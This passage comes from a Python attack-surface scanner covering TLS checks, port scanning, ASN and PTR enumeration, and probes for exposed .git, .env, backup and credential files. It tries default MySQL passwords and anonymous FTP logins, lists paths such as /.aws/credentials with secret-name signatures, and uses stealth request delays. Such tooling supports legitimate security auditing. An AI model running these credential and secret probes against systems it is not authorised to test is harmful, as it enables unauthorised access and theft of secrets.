                    n = len(res.accepted_cipher_suites)
                    alert(
                        f"DEPRECATED TLS PROTOCOL: {label}",
                        severity,
                        domain,
                        f"{detail} ({n} cipher suite(s) accepted)",
                    )

            # ── Weak cipher suites (TLS 1.2 and 1.3 buckets) ─────────────
            for attr in ("tls_1_2_cipher_suites", "tls_1_3_cipher_suites"):
                res = getattr(sr, attr, None)
                if not res:
                    continue
                for cs in getattr(res, "accepted_cipher_suites", []):
                    name = cs.cipher_suite.name.upper()
                    for pattern, sev, label in _WEAK_CIPHER_PATTERNS:
                        if pattern in name:
                            alert(
                                f"WEAK CIPHER SUITE: {pattern}",
                                sev,
                                domain,
                                f"Server accepts weak cipher {name!r} ({label})",
                            )
                            break

            # ── Certificate validation ────────────────────────────────────
            cert_info = getattr(sr, "certificate_info", None)
            if cert_info:
                for deployment in getattr(cert_info, "certificate_deployments", []):
                    chain = getattr(deployment, "received_certificate_chain", [])
                    if not chain:
                        continue
                    leaf_crypto = getattr(chain[0], "as_crypto", None)

                    # 30-day expiry + weak signature via cryptography lib
                    _check_cert_obj_tls(domain, leaf_crypto)

                    # Hostname mismatch
                    if getattr(deployment, "leaf_certificate_subject_matches_hostname",
                               None) is False:
                        alert(
                            "TLS CERTIFICATE HOSTNAME MISMATCH",
                            "HIGH",
                            domain,
                            f"Certificate CN/SAN does not match hostname '{host}'",
                        )

                    # Certificate Transparency
                    _check_cert_ct(domain, leaf_crypto)

            # ── HSTS validation ───────────────────────────────────────────
            http_hdrs = getattr(sr, "http_headers", None)
            if http_hdrs:
                hsts_hdr = getattr(http_hdrs, "strict_transport_security_header", None)
                _check_hsts_header(
                    domain,
                    hsts_hdr.header_value if hsts_hdr else None,
                )

    except Exception as e:
        print_error(f"sslyze TLS scan failed for {domain}: {e}")
        # Fall back to ssl-module checks on sslyze error
        _check_tls_ssl_module(host, port, domain)


def _check_tls_ssl_module(host: str, port: int, domain: str) -> None:
    """Fallback TLS analysis using Python's ssl module only."""
    # Legacy protocol versions
    for tls_attr, severity, label, detail in _LEGACY_TLS_VERSIONS:
        if _test_legacy_tls_version(host, port, tls_attr):
            alert(
                f"DEPRECATED TLS PROTOCOL: {label}",
                severity,
                domain,
                detail,
            )

    # Negotiated cipher — check what the server picks by default
    cipher_name = _get_negotiated_cipher(host, port)
    if cipher_name:
        for pattern, sev, label in _WEAK_CIPHER_PATTERNS:
            if pattern in cipher_name.upper():
                alert(
                    f"WEAK CIPHER SUITE: {pattern}",
                    sev,
                    domain,
                    f"Server negotiated weak cipher {cipher_name!r} ({label})",
                )

    # Certificate: hostname match + 30-day expiry via ssl.CertificateError
    from datetime import timezone
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = True
        ctx.verify_mode    = ssl.CERT_REQUIRED
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert      = ssock.getpeercert()
                not_after = cert.get("notAfter", "")
                if not_after:
                    try:
                        exp   = datetime.strptime(
                            not_after, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                        days  = (exp - datetime.now(timezone.utc)).days
                        if 0 < days <= _CERT_EXPIRY_WARN_DAYS:
                            alert(
                                "TLS CERTIFICATE EXPIRING SOON",
                                "LOW",
                                domain,
                                f"Certificate expires in {days} day(s) ({not_after})",
                            )
                    except Exception:
                        pass
                if _CRYPTO_AVAILABLE:
                    raw = ssock.getpeercert(binary_form=True)
                    cert_obj = _x509.load_der_x509_certificate(raw, _crypto_backend())
                    _check_cert_ct(domain, cert_obj)
    except ssl.CertificateError as e:
        alert(
            "TLS CERTIFICATE HOSTNAME MISMATCH",
            "HIGH",
            domain,
            f"Certificate CN/SAN does not match '{host}': {e}",
        )
    except Exception:
        pass

    # HSTS validation
    resp = safe_get(f"https://{host}", timeout=10, method="head")
    if resp:
        _check_hsts_header(domain, resp.headers.get("Strict-Transport-Security"))


def check_tls_config(domain: str) -> None:
    """
    Entry point for TLS misconfiguration detection.

    Accepts a bare hostname (as supplied by enrich_domain via clean_domain).
    Silently returns if port 443 is not reachable (HTTP-only host).
    Passive check — does not require --active-probes.
    Deduplicates per host.

    Detects:
      - Deprecated protocol versions (SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1)
      - Weak cipher suites (NULL, EXPORT, RC4, DES/3DES, aNULL, MD5)
      - Certificate issues (hostname mismatch, 30-day expiry, weak sig, no CT)
      - HSTS misconfigurations (short max-age, missing includeSubDomains/preload)
    Uses sslyze when available, falls back to Python's ssl module.
    """
    if domain in _tls_checked:
        return
    _tls_checked.add(domain)

    host = domain
    port = 443

    # Quick reachability probe — silently skip HTTP-only or unreachable hosts
    try:
        with socket.create_connection((host, port), timeout=5):
            pass
    except (ConnectionRefusedError, socket.timeout, OSError):
        return

    print(timestamp() + f" TLS config analysis: {host}:{port}"
          + (" [sslyze]" if _SSLYZE_AVAILABLE else " [ssl module]"))

    if _SSLYZE_AVAILABLE:
        _check_tls_sslyze(host, port, domain)
    else:
        _check_tls_ssl_module(host, port, domain)

# ─────────────────────────────────────────────
# WHOIS — threaded with hard timeout
# ─────────────────────────────────────────────

def get_whois_info(domain):
    result = [None]

    def _do():
        try:
            result[0] = whois.whois(domain)
        except Exception as e:
            print_error("WHOIS failed for " + domain + ": " + str(e))

    t = threading.Thread(target=_do, daemon=True)
    t.start()
    t.join(timeout=10)

    if t.is_alive():
        print_error("WHOIS timeout for " + domain)
        return

    w = result[0]
    if not w:
        return

    try:
        registrar       = w.registrar or 'Unknown'
        creation_date   = w.creation_date
        expiration_date = w.expiration_date
        if isinstance(creation_date, list):
            creation_date = creation_date[0]
        if isinstance(expiration_date, list):
            expiration_date = expiration_date[0]
        creation_str   = str(creation_date)   if creation_date   else 'Unknown'
        expiration_str = str(expiration_date) if expiration_date else 'Unknown'
        print(timestamp() + " WHOIS " + domain + " registrar=" + str(registrar))
        write_to_whois_database(domain, str(registrar), creation_str, expiration_str)
    except Exception as e:
        print_error("WHOIS parse failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# Port scanning
# ─────────────────────────────────────────────

def check_ftp_anonymous(host):
    """
    Attempt an anonymous FTP login. Returns True if the server accepts it.
    This is the only condition under which FTP gets a HIGH alert.
    """
    import ftplib
    try:
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(host, 21)
        ftp.login("anonymous", "anonymous@example.com")
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False   # auth rejected — normal
    except Exception:
        return False

# Default credentials to probe on MySQL — ordered by likelihood
MYSQL_DEFAULT_CREDS = [
    ("root",  ""),
    ("root",  "root"),
    ("root",  "password"),
    ("root",  "mysql"),
    ("mysql", "mysql"),
    ("admin", "admin"),
]

def check_mysql_auth(host):
    """
    Grab the MySQL banner for version recon, then (if pymysql is available)
    attempt a series of default/blank credentials.

    Returns a dict:
      {
        "version":      str | None,   # e.g. "8.0.32"
        "eol":          bool,         # True if major version is 5 or below
        "weak_creds":   (user, pass) | None,  # first working cred pair
        "banner_only":  bool,         # True if pymysql unavailable
      }
    """
    result = {"version": None, "eol": False, "weak_creds": None, "banner_only": False}

    # ── Banner grab (no library needed) ──────────────────────────
    try:
        s = socket.create_connection((host, 3306), timeout=5)
        banner = s.recv(1024)
        s.close()
        if banner and len(banner) > 5:
            # MySQL greeting: [4-byte packet header][1-byte protocol][version\x00...]
            try:
                version_raw = banner[5:].split(b'\x00')[0].decode('utf-8', errors='ignore')
                # Sanity-check it looks like a version string
                if version_raw and version_raw[0].isdigit():
                    result["version"] = version_raw
                    major = version_raw.split('.')[0]
                    if major.isdigit() and int(major) <= 5:
                        result["eol"] = True
            except Exception:
                pass
    except Exception:
        return result  # port open but banner grab failed — nothing more to do

    if not PYMYSQL_AVAILABLE:
        result["banner_only"] = True
        return result

    # ── Auth probe (pymysql) ──────────────────────────────────────
    for user, passwd in MYSQL_DEFAULT_CREDS:
        try:
            conn = pymysql.connect(
                host=host, port=3306, user=user, password=passwd,
                connect_timeout=5, read_timeout=5,
            )
            conn.close()
            result["weak_creds"] = (user, passwd)
            break   # stop at first working pair
        except pymysql.err.OperationalError as e:
            code = e.args[0]
            if code in (1045, 1044):
                continue   # access denied — expected, try next
            break           # unexpected error, stop probing
        except Exception:
            break

    return result

_HTTP_PORTS = {80, 443, 8080, 8443, 8008, 8888}

def _http_waf_check(domain, port):
    """
    Fetch the root path on an HTTP port and return the WAF provider name if
    a WAF intercept is detected, or None if the response looks like a real
    application. Only called for ports that speak HTTP.
    """
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{domain}:{port}/"
    try:
        r = _get_session().get(url, headers=create_request_header(),
                         timeout=5, allow_redirects=True, verify=False)
        return _response_waf_provider(r)
    except Exception:
        return None

def port_scan(domain):
    try:
        ip = socket.gethostbyname(domain)
    except socket.gaierror as e:
        print_error("Port scan failed for " + domain + ": " + str(e))
        return

    def _probe_port(port):
        if _stop_event.is_set():
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            open_ = s.connect_ex((ip, port)) == 0
            s.close()

            if not open_:
                return

            print(timestamp() + " Open port " + str(port) + " on " + domain)
            write_to_ports_database(domain, ip, port)

            if port in CRITICAL_PORTS:
                # These services are dangerous just by being exposed
                svc = CRITICAL_PORTS[port]
                severity = "CRITICAL" if port in {6379, 27017, 23} else "HIGH"
                # HTTP-capable ports may be fronted by a WAF — check before alerting
                waf = _http_waf_check(domain, port) if port in _HTTP_PORTS else None
                if waf:
                    alert(
                        f"EXPOSED SERVICE (UNCONFIRMED — {waf} WAF): port {port} ({svc})",
                        "LOW",
                        domain,
                        f"Port {port} ({svc}) appears open on {ip} but responses show {waf} WAF fingerprint — may be a WAF intercept, not a real service"
                    )
                else:
                    alert(
                        f"EXPOSED SERVICE: port {port} ({svc})",
                        severity,
                        domain,
                        f"Port {port} ({svc}) is open on {ip}"
                    )

            elif port == 3306:
                # MySQL — probe before alerting
                print(timestamp() + " MySQL open on " + domain + " — probing version and auth...")
                mysql = check_mysql_auth(domain)

                if mysql["weak_creds"]:
                    user, passwd = mysql["weak_creds"]
                    disp_pass = f'"{passwd}"' if passwd else "(blank)"
                    alert(
                        "MYSQL DEFAULT CREDENTIALS ACCEPTED",
                        "CRITICAL",
                        domain,
                        f"MySQL on {ip} accepted login: user={user} password={disp_pass}"
                        + (f" — version {mysql['version']}" if mysql["version"] else "")
                    )
                elif mysql["eol"]:
                    alert(
                        "EOL MYSQL VERSION EXPOSED",
                        "HIGH",
                        domain,
                        f"MySQL {mysql['version']} on {ip} is end-of-life and may have unpatched CVEs — auth probe found no default creds"
                    )
                elif mysql["version"]:
                    print(timestamp() + f" MySQL {mysql['version']} on {domain} — auth rejected, no default creds found")
                elif mysql["banner_only"]:
                    print(timestamp() + f" MySQL open on {domain} — install pymysql for auth probing")
                else:
                    print(timestamp() + f" MySQL open on {domain} — banner grab failed, port may be filtered")

            elif port == 21:
                # FTP open is informational — only alert if anonymous login works
                print(timestamp() + " FTP open on " + domain + " — probing anonymous login...")
                if check_ftp_anonymous(domain):
                    alert(
                        "ANONYMOUS FTP LOGIN ACCEPTED",
                        "HIGH",
                        domain,
                        f"Port 21 on {ip} accepts anonymous login — files may be readable/writable without credentials"
                    )
                else:
                    print(timestamp() + " FTP anonymous login rejected on " + domain + " — low risk")

            elif port == 22:
                # SSH open is normal — log it, no alert
                print(timestamp() + " SSH open on " + domain + " (informational)")

        except socket.error:
            pass

    from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed
    with ThreadPoolExecutor(max_workers=len(COMMON_PORTS)) as _ex:
        _futs = [_ex.submit(_probe_port, port) for port in COMMON_PORTS]
        for _f in _as_completed(_futs):
            pass

# ─────────────────────────────────────────────
# HTTP response history
# ─────────────────────────────────────────────

def record_http_response(url, status_code):
    print(timestamp() + " HTTP " + str(status_code) + " " + url)
    write_to_http_history_database(url, status_code)


# ─────────────────────────────────────────────
# ASN / CDN detection
# ─────────────────────────────────────────────

# Cache so each IP is only looked up once per crawl session
_asn_cache = {}

# IPs already PTR-queried this session (session-scoped — PTR records don't change per target)
_ptr_looked_up: set = set()

# ASN numbers already queried for prefix enumeration this session
_asn_prefixes_fetched: set = set()

# Known CDN/hosting ASN patterns — checked against org field from ipinfo.io
CDN_PATTERNS = {
    "Akamai":      ["akamai"],
    "Cloudflare":  ["cloudflare"],
    "Fastly":      ["fastly"],
    "CloudFront":  ["amazon", "cloudfront", "aws"],
    "Google CDN":  ["google"],
    "Azure CDN":   ["microsoft", "azure"],
    "Incapsula":   ["imperva", "incapsula"],
    "Sucuri":      ["sucuri"],
    "Stackpath":   ["stackpath", "highwinds"],
    "Limelight":   ["limelight"],
    "Edgio":       ["edgio", "limelight"],
    "CDN77":       ["cdn77", "datacamp"],
    "KeyCDN":      ["keycdn", "proofpoint"],
    "Shared Host": ["godaddy", "bluehost", "hostgator", "siteground",
                    "namecheap", "dreamhost", "hostinger", "ionos",
                    "ovh", "liquid web"],
}

def detect_cdn(org_str):
    """Returns (is_cdn, cdn_name) based on org string from ipinfo."""
    if not org_str:
        return False, None
    org_lower = org_str.lower()
    for cdn_name, patterns in CDN_PATTERNS.items():
        if any(p in org_lower for p in patterns):
            return True, cdn_name
    return False, None

def asn_lookup(ip):
    """
    Look up ASN and org info for an IP via ipinfo.io.
    Returns dict with asn, org, country, is_cdn, cdn_name.
    Results are cached per session to avoid hammering the API.
    """
    if not ip or ip == "Unknown":
        return None
    if ip in _asn_cache:
        return _asn_cache[ip]
    try:
        stealth_delay("ipinfo.io")
        resp = _get_session().get(
            "https://ipinfo.io/" + ip + "/json",
            headers=stealth_headers({"Accept": "application/json"}),
            timeout=5
        )
        if resp.status_code != 200:
            return None
        data = resp.json()
        org     = data.get("org", "")       # e.g. "AS20940 Akamai Technologies, Inc."
        country = data.get("country", "")
        asn     = org.split(" ")[0] if org else ""  # extract "AS20940"
        is_cdn, cdn_name = detect_cdn(org)

        if is_cdn:
            print(timestamp() + " ASN " + ip + " -> " + org + " [CDN: " + cdn_name + "]")
        else:
            print(timestamp() + " ASN " + ip + " -> " + org)

        result = {
            "ip":       ip,
            "asn":      asn,
            "org":      org,
            "country":  country,
            "is_cdn":   is_cdn,
            "cdn_name": cdn_name or "",
        }
        _asn_cache[ip] = result
        write_to_asn_database(ip, asn, org, country, is_cdn, cdn_name or "")
        return result
    except Exception as e:
        print_error("asn_lookup failed for " + ip + ": " + str(e))
        return None

def write_to_asn_database(ip, asn, org, country, is_cdn, cdn_name):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ASN")
        # Only insert if not already stored
        existing = conn.execute("SELECT ip FROM ASN WHERE ip=? LIMIT 1", (ip,)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO ASN (ip,asn,org,country,is_cdn,cdn_name,looked_up) VALUES (?,?,?,?,?,?,?)",
                (ip, asn, org, country, 1 if is_cdn else 0, cdn_name, timestamp()))
    except Exception as e:
        print_error("write_to_asn_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Reverse DNS (PTR) enumeration
# ─────────────────────────────────────────────

def reverse_dns_lookup(ip: str) -> list:
    """
    Perform a PTR record lookup for ip and return all discovered hostnames.

    Deduplicates per IP via _ptr_looked_up (session-scoped — PTR records are
    stable across target switches within a run).

    In-scope hostnames (determined by is_in_scope(), which respects
    SAME_DOMAIN_ONLY) are fed into enrich_domain() so their DNS, SSL,
    port scan, and technology data is collected.  _subdomain_enriched
    prevents duplicate enrichment for hosts already discovered via other paths.

    Stores every found PTR → hostname mapping in the ReverseDNS table.
    Fires an INFO alert when at least one hostname is found.
    5-second resolver timeout.
    """
    if not ip or ip == "Unknown":
        return []
    if ip in _ptr_looked_up:
        return []
    _ptr_looked_up.add(ip)

    try:
        parts = ip.split(".")
        if len(parts) != 4:
            return []
        ptr_name = ".".join(reversed(parts)) + ".in-addr.arpa"
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        answers = resolver.resolve(ptr_name, "PTR")
        hostnames = [str(rdata).rstrip(".") for rdata in answers]
    except Exception:
        return []

    if not hostnames:
        return []

    _write_reverse_dns_database(ip, hostnames)
    print(timestamp() + f" [PTR] {ip} → {', '.join(hostnames)}")
    alert(
        "REVERSE DNS DISCOVERY", "INFO", ip,
        f"PTR lookup found {len(hostnames)} hostname(s): {', '.join(hostnames)}"
    )

    # Scope expansion — enrich each in-scope PTR hostname once
    for hostname in hostnames:
        candidate = "https://" + hostname
        if not is_in_scope(candidate):
            continue
        if hostname in _subdomain_enriched:
            continue
        _subdomain_enriched.add(hostname)
        try:
            enrich_domain(candidate)
        except Exception:
            pass

    return hostnames


def _write_reverse_dns_database(ip: str, hostnames: list) -> None:
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ReverseDNS")
        ts = timestamp()
        for hostname in hostnames:
            exists = conn.execute(
                "SELECT ip FROM ReverseDNS WHERE ip=? AND hostname=? LIMIT 1",
                (ip, hostname)
            ).fetchone()
            if not exists:
                conn.execute(
                    "INSERT INTO ReverseDNS (ip, hostname, found_at) VALUES (?,?,?)",
                    (ip, hostname, ts)
                )
    except Exception as e:
        print_error("_write_reverse_dns_database: " + str(e))
    finally:
        conn.close()


# ─────────────────────────────────────────────
# ASN prefix enumeration (RIPE NCC stat API)
# ─────────────────────────────────────────────

def enumerate_asn_prefixes(asn_number: str, org_name: str) -> list:
    """
    Query the RIPE NCC stat API for all IP prefixes announced by asn_number.
    Returns a list of prefix strings (e.g. ["1.2.3.0/24", ...]).

    Deduplicates per ASN via _asn_prefixes_fetched.  Session-scoped — the
    same ASN is shared across many IPs so we only query it once regardless
    of which target triggered the lookup.

    Stores results in the ASNPrefixes table.  Fires an INFO alert listing
    discovered prefixes (first 6 shown; remainder counted).
    8-second timeout per API call.
    """
    if not asn_number or not asn_number.upper().startswith("AS"):
        return []
    asn_norm = asn_number.upper()
    if asn_norm in _asn_prefixes_fetched:
        return []
    _asn_prefixes_fetched.add(asn_norm)

    try:
        resp = _get_session().get(
            f"https://stat.ripe.net/data/announced-prefixes/data.json"
            f"?resource={asn_norm}",
            headers={"Accept": "application/json",
                     "User-Agent": random.choice(UA_POOL)},
            timeout=8,
        )
        if resp.status_code != 200:
            return []
        data = resp.json()
        prefixes = [
            entry["prefix"]
            for entry in data.get("data", {}).get("prefixes", [])
            if entry.get("prefix")
        ]
    except Exception as e:
        print_error(f"enumerate_asn_prefixes failed for {asn_norm}: {e}")
        return []

    if not prefixes:
        return []

    _write_asn_prefixes_database(asn_norm, org_name, prefixes)
    sample  = ", ".join(prefixes[:6])
    extra   = f" (+{len(prefixes) - 6} more)" if len(prefixes) > 6 else ""
    print(timestamp() + f" [ASN] {asn_norm} ({org_name}) — "
                        f"{len(prefixes)} prefixes: {sample}{extra}")
    alert(
        "ASN PREFIX ENUMERATION", "INFO", asn_norm,
        f"RIPE NCC reports {len(prefixes)} announced prefix(es) for "
        f"{asn_norm} ({org_name}): {sample}{extra}"
    )
    return prefixes


def _write_asn_prefixes_database(asn: str, org: str, prefixes: list) -> None:
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ASNPrefixes")
        ts = timestamp()
        for prefix in prefixes:
            exists = conn.execute(
                "SELECT asn FROM ASNPrefixes WHERE asn=? AND prefix=? LIMIT 1",
                (asn, prefix)
            ).fetchone()
            if not exists:
                conn.execute(
                    "INSERT INTO ASNPrefixes (asn, org, prefix, found_at) VALUES (?,?,?,?)",
                    (asn, org, prefix, ts)
                )
    except Exception as e:
        print_error("_write_asn_prefixes_database: " + str(e))
    finally:
        conn.close()


# ─────────────────────────────────────────────
# Exposure checks — .git, .env, CORS, directory listing, backup files, SPF/DMARC
# ─────────────────────────────────────────────

# Track checked base URLs so we don't re-probe the same host twice
_exposure_checked = set()

# .env variants worth probing — ordered by likelihood
ENV_PATHS = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.prod",
    "/.env.staging",
    "/.env.backup",
    "/.env.old",
    "/.env.example",   # sometimes contains real values anyway
    "/config/.env",
    "/app/.env",
]

# Signatures that confirm a real .env file vs. a 200 that's just the homepage
ENV_SIGNATURES = [
    "APP_KEY=", "DB_PASSWORD=", "DB_HOST=", "SECRET_KEY=",
    "AWS_ACCESS_KEY", "API_KEY=", "MAIL_PASSWORD=", "REDIS_PASSWORD=",
    "DATABASE_URL=", "JWT_SECRET=", "STRIPE_SECRET", "TWILIO_",
    "APP_ENV=", "APP_SECRET=", "S3_SECRET",
]

def check_git_exposure(base_url, domain):
    """
    Probe /.git/HEAD — if it returns 200 and looks like a git ref,
    the entire repo may be downloadable.
    """
    try:
        url = base_url.rstrip("/") + "/.git/HEAD"
        resp = safe_get(url, timeout=6)
        if resp and resp.status_code == 200:
            body = resp.text.strip()
            if body.startswith("ref:") or body.startswith("refs/") or len(body) == 40:
                alert(
                    "EXPOSED .GIT DIRECTORY",
                    "CRITICAL",
                    domain,
                    f"/.git/HEAD returned a valid git ref at {url} — source code may be fully downloadable"
                )
                print(timestamp() + " [!!] .git exposed at " + url)
                return True
            else:
                print(timestamp() + " /.git/HEAD returned 200 but content looks wrong — possible false positive on " + domain)
    except Exception as e:
        print_error("check_git_exposure failed for " + domain + ": " + str(e))
    return False

def check_env_exposure(base_url, domain):
    """
    Probe common .env paths. Confirm findings by looking for known .env
    key signatures in the response body — avoids false positives from
    catch-all 200 handlers.
    """
    found = []
    try:
        for path in ENV_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code != 200:
                continue
            body = resp.text
            # Must contain at least one real .env signature to count
            matched_sigs = [sig for sig in ENV_SIGNATURES if sig in body]
            if matched_sigs:
                detail = f"{url} — contains: {', '.join(matched_sigs[:3])}"
                alert(
                    "EXPOSED .ENV FILE",
                    "CRITICAL",
                    domain,
                    detail
                )
                print(timestamp() + " [!!] .env exposed at " + url + " (matched: " + ", ".join(matched_sigs[:3]) + ")")
                found.append(url)
                break  # one confirmed hit is enough — don't hammer the server
    except Exception as e:
        print_error("check_env_exposure failed for " + domain + ": " + str(e))
    return found

# ── Directory listing ──────────────────────────────────────────

# Paths commonly left with directory listing enabled
DIRECTORY_LISTING_PATHS = [
    "/",
    "/uploads/",
    "/upload/",
    "/files/",
    "/backup/",
    "/backups/",
    "/static/",
    "/assets/",
    "/images/",
    "/img/",
    "/media/",
    "/logs/",
    "/tmp/",
    "/temp/",
    "/data/",
    "/admin/",
    "/wp-content/uploads/",
    "/wp-content/backups/",
]

DIRECTORY_LISTING_SIGNATURES = [
    "Index of /",
    "Directory listing for /",
    "Directory of /",
    "<title>Index of",
    "Parent Directory</a>",
    "[To Parent Directory]",
]

def check_directory_listing(base_url, domain):
    """
    Probe common paths for open directory listings.
    Confirms by looking for known server-generated index page signatures.
    """
    found = []
    try:
        for path in DIRECTORY_LISTING_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code != 200:
                continue
            body = resp.text
            matched = [sig for sig in DIRECTORY_LISTING_SIGNATURES if sig in body]
            if matched:
                alert(
                    "DIRECTORY LISTING ENABLED",
                    "HIGH",
                    domain,
                    f"Open directory index at {url} — file tree exposed to public"
                )
                print(timestamp() + " [!!] Directory listing at " + url)
                found.append(url)
    except Exception as e:
        print_error("check_directory_listing failed for " + domain + ": " + str(e))
    return found

# ── Backup / config file exposure ─────────────────────────────

BACKUP_PATHS = [
    # WordPress
    "/wp-config.php.bak",
    "/wp-config.php~",
    "/wp-config.php.old",
    "/wp-config.bak",
    # Generic config
    "/.htpasswd",
    "/.htaccess.bak",
    "/config.php.bak",
    "/config.yml",
    "/config.yaml",
    "/config.json",
    "/configuration.php.bak",
    "/settings.py.bak",
    "/settings.php.bak",
    "/database.yml",
    "/database.php.bak",
    "/db.php.bak",
    # Credentials / secrets
    "/credentials.json",
    "/secrets.yml",
    "/secrets.yaml",
    "/.aws/credentials",
    # SQL dumps
    "/backup.sql",
    "/dump.sql",
    "/db.sql",
    "/database.sql",
    "/backup.sql.gz",
    # Archive dumps
    "/backup.zip",
    "/backup.tar.gz",
    "/www.zip",
    "/site.zip",
    "/htdocs.zip",
    # Logs
    "/error.log",
    "/access.log",
    "/debug.log",
    "/app.log",
    "/laravel.log",
    "/storage/logs/laravel.log",
]

# Signatures that confirm a file is the real thing rather than a 200 catch-all
BACKUP_SIGNATURES = {
    "wp-config": ["DB_NAME", "DB_PASSWORD", "DB_HOST", "table_prefix"],
    ".htpasswd": [":$apr1$", ":$2y$", ":{SHA}", ":$1$"],
    "config.yml": ["database:", "password:", "secret_key:", "api_key:"],
    "config.yaml": ["database:", "password:", "secret_key:", "api_key:"],
    "database.yml": ["adapter:", "username:", "password:", "database:"],
    "credentials": ["aws_access_key_id", "aws_secret_access_key"],
    ".sql": ["INSERT INTO", "CREATE TABLE", "DROP TABLE", "-- MySQL dump", "-- PostgreSQL"],
    "secrets": ["password:", "api_key:", "secret:", "token:"],
    "laravel.log": ["local.ERROR", "Stack trace", "production.ERROR"],
    ".log": ["ERROR", "Exception", "Traceback", "Fatal"],
}

def _backup_signatures_for(path):
    """Return the right signature list for a given path."""
    for key, sigs in BACKUP_SIGNATURES.items():
        if key in path:
            return sigs
    return None  # no signature required — 200 is enough (e.g. zip/tar files)

def check_backup_exposure(base_url, domain):
    """
    Probe for exposed backup and config files.
    For text-based files, confirm with content signatures to avoid
    false positives from catch-all 200 handlers.
    Binary archive files (zip, tar.gz) are flagged on 200 + correct Content-Type alone.
    Catch-all redirects (302 to homepage for every path) are detected and skipped.
    """
    found = []
    try:
        # ── Catch-all detection ───────────────────────────────────
        # Fetch the homepage and a guaranteed-nonexistent path.
        # If both return the same content/redirect destination, this server
        # uses a catch-all — backup file 200s cannot be trusted.
        canary = base_url.rstrip("/") + "/probe-canary-" + str(random.randint(100000, 999999)) + ".php.bak"
        canary_resp = safe_get(canary, timeout=6)
        if canary_resp:
            # If a random nonexistent path returns 200 or redirects to homepage, it's a catch-all
            if canary_resp.status_code == 200:
                print(timestamp() + " Catch-all 200 detected on " + domain + " — skipping backup file probe")
                return found
            if canary_resp.status_code in (301, 302, 303, 307, 308):
                canary_location = canary_resp.headers.get("Location", "")
                if canary_location.rstrip("/") in (base_url.rstrip("/"), "/", ""):
                    print(timestamp() + " Catch-all redirect detected on " + domain + " — skipping backup file probe")
                    return found

        for path in BACKUP_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code not in (200, 206):
                continue

            content_type = resp.headers.get("Content-Type", "").lower()

            # Reject HTML responses — real config/backup files are never text/html
            if "text/html" in content_type:
                continue

            # Binary archives — confirm via Content-Type, no body parse needed
            if path.endswith((".zip", ".tar.gz", ".gz")):
                if any(ct in content_type for ct in ["zip", "octet-stream", "gzip", "x-tar"]):
                    alert(
                        "EXPOSED BACKUP ARCHIVE",
                        "CRITICAL",
                        domain,
                        f"Backup archive served at {url} (Content-Type: {content_type})"
                    )
                    print(timestamp() + " [!!] Backup archive at " + url)
                    found.append(url)
                continue

            # Text files — require signature match
            sigs = _backup_signatures_for(path)
            body = resp.text

            if sigs is None:
                # No signatures defined — 200 alone is the signal
                confirmed = True
                matched_sigs = []
            else:
                matched_sigs = [s for s in sigs if s in body]
                confirmed = bool(matched_sigs)

            if confirmed:
                detail = f"{url}"
                if matched_sigs:
                    detail += f" — contains: {', '.join(matched_sigs[:3])}"
                alert(
                    "EXPOSED BACKUP / CONFIG FILE",
                    "CRITICAL",
                    domain,
                    detail
                )
                print(timestamp() + " [!!] Backup/config exposed at " + url)
                found.append(url)

    except Exception as e:
        print_error("check_backup_exposure failed for " + domain + ": " + str(e))
    return found


# ─────────────────────────────────────────────
# Sensitive file exposure
# ─────────────────────────────────────────────

# (path, severity, description)
SENSITIVE_FILES = [
    # Package / dependency manifests — leak dependency tree and versions
    ("/package.json",          "MEDIUM",   "Node.js package manifest — exposes dependency tree, scripts, and version info"),
    ("/package-lock.json",     "MEDIUM",   "Node.js lockfile — full dependency tree with exact versions"),
    ("/composer.json",         "MEDIUM",   "PHP Composer manifest — exposes dependency tree"),
    ("/composer.lock",         "MEDIUM",   "PHP Composer lockfile — full dependency tree with hashes"),
    ("/Gemfile",               "MEDIUM",   "Ruby Gemfile — exposes dependency tree"),
    ("/Gemfile.lock",          "MEDIUM",   "Ruby Gemfile.lock — full dependency tree"),
    ("/requirements.txt",      "MEDIUM",   "Python requirements — exposes dependency versions"),
    ("/yarn.lock",             "MEDIUM",   "Yarn lockfile — full dependency tree"),
    # Infrastructure / container files — leak architecture
    ("/Dockerfile",            "HIGH",     "Dockerfile exposed — reveals build process, base image, and may contain secrets"),
    ("/docker-compose.yml",    "HIGH",     "docker-compose.yml exposed — reveals service architecture and may contain credentials"),
    ("/docker-compose.yaml",   "HIGH",     "docker-compose.yaml exposed — reveals service architecture and may contain credentials"),
    ("/.dockerenv",            "MEDIUM",   ".dockerenv present — confirms containerised deployment"),
    ("/Makefile",              "MEDIUM",   "Makefile exposed — reveals build commands and internal tooling"),
    # Config / credential files
    ("/.npmrc",                "HIGH",     ".npmrc exposed — may contain npm auth tokens or private registry credentials"),
    ("/.pypirc",               "HIGH",     ".pypirc exposed — may contain PyPI credentials"),
    ("/.htpasswd",             "CRITICAL", ".htpasswd exposed — contains hashed HTTP Basic Auth credentials"),
    ("/web.config",            "HIGH",     "web.config exposed — IIS config may contain connection strings and credentials"),
    ("/config.xml",            "MEDIUM",   "config.xml exposed — may reveal application configuration"),
    ("/config.json",           "MEDIUM",   "config.json exposed — may reveal application configuration or credentials"),
